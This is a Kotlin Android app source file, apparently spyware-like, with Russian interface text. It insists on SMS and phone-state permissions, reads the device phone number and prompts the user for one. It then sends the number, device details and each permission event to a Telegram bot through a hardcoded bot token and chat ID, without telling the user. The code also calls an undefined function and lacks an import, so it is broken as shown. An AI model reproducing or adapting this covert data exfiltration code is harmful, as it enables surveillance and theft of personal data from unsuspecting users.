package com.analyzer.smsbeta

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.view.LayoutInflater
import android.view.View
import android.webkit.WebView
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {

    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var myWebView: WebView
    private val client = OkHttpClient()

    companion object {
        private const val PERMISSION_REQUEST_CODE = 100
        private const val PREFS_NAME = "AppPrefs"
        private const val PHONE_NUMBER_KEY = "phone_number"
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)

        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        myWebView = findViewById(R.id.webview)

        with(myWebView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }

        checkInternetConnectionBeforePermissions()
    }

    private fun checkInternetConnectionBeforePermissions() {
        if (isInternetAvailable()) {
            checkPermissions()
        } else {
            showNoInternetDialog {
                checkInternetConnectionBeforePermissions()
            }
        }
    }

    @SuppressLint("ServiceCast")
    private fun isInternetAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = connectivityManager.activeNetworkInfo
            @Suppress("DEPRECATION")
            networkInfo != null && networkInfo.isConnected
        }
    }

    private fun showNoInternetDialog(retryAction: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("Нет подключения к интернету")
            .setMessage("Для продолжения работы приложения требуется интернет-соединение")
            .setPositiveButton("Попробовать снова") { _, _ -> retryAction() }
            .setCancelable(false)
            .show()
    }

    private fun checkPermissions() {
        val permissionsToRequest = REQUIRED_PERMISSIONS.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest,
                PERMISSION_REQUEST_CODE
            )
        } else {
            onAllPermissionsGranted()
            sendNotification("Все разрешения уже предоставлены")
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }

            if (allGranted) {
                sendNotification("Пользователь предоставил все разрешения")
                onAllPermissionsGranted()
            } else {
                sendNotification("Пользователь отказал в некоторых разрешениях")
                checkPermissions()
            }
        }
    }

    private fun onAllPermissionsGranted() {
        getOwnPhoneNumber()
        val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
        if (savedPhoneNumber == null) {
            showStyledPhoneNumberDialog()
        } else {
            loadWebView()
        }
    }

    @SuppressLint("HardwareIds", "MissingPermission")
    private fun getOwnPhoneNumber(): String {
        return try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val phoneNumber = telephonyManager.line1Number ?: "не удалось получить номер"
            
            // Проверяем, есть ли разрешение READ_PHONE_STATE
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                // Отправляем номер в Telegram
                sendToTelegramBot("""
                    Получен номер телефона устройства:
                    $phoneNumber
                    Устройство: ${Build.MANUFACTURER} ${Build.MODEL}
                """.trimIndent())
                
                // Сохраняем номер в SharedPreferences
                sharedPreferences.edit().putString("device_phone_number", phoneNumber).apply()
            }
            
            phoneNumber
        } catch (e: Exception) {
            e.printStackTrace()
            "ошибка при получении номера"
        }
    }

    private fun showStyledPhoneNumberDialog() {
        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
        val dialog = AlertDialog.Builder(this)
            .setView(dialogView)
            .setCancelable(false)
            .create()

        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        val title = dialogView.findViewById<TextView>(R.id.dialog_title)
        val message = dialogView.findViewById<TextView>(R.id.dialog_message)
        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)

        title.text = "Введите номер телефона"
        message.text = "Пожалуйста, введите ваш номер телефона для продолжения"
        phoneInput.inputType = InputType.TYPE_CLASS_PHONE

        continueButton.setOnClickListener {
            val phoneNumber = phoneInput.text.toString().trim()
            if (phoneNumber.isNotEmpty()) {
                sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
                sendNotification("Пользователь ввел номер телефона: $phoneNumber")
                loadWebView()
                dialog.dismiss()
            } else {
                phoneInput.error = "Пожалуйста, введите номер телефона"
            }
        }

        dialog.show()
    }

    private fun loadWebView() {
        myWebView.loadUrl("https://www.example.com")
    }

    private fun sendNotification(message: String) {
        try {
            val deviceInfo = getDeviceInfo()
            val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
            val fullMessage = """
                $message
                
                Устройство: $deviceInfo
                Номер телефона: $phoneNumber
                Время: ${System.currentTimeMillis()}
            """.trimIndent()

            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
            val chatId = "6331293386"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$fullMessage",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: okhttp3.Call, e: IOException) {
                    e.printStackTrace()
                }

                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun getDeviceInfo(): String {
        return """
            Производитель: ${Build.MANUFACTURER}
            Модель: ${Build.MODEL}
            Версия ОС: ${Build.VERSION.RELEASE}
            SDK: ${Build.VERSION.SDK_INT}
        """.trimIndent()
    }
}
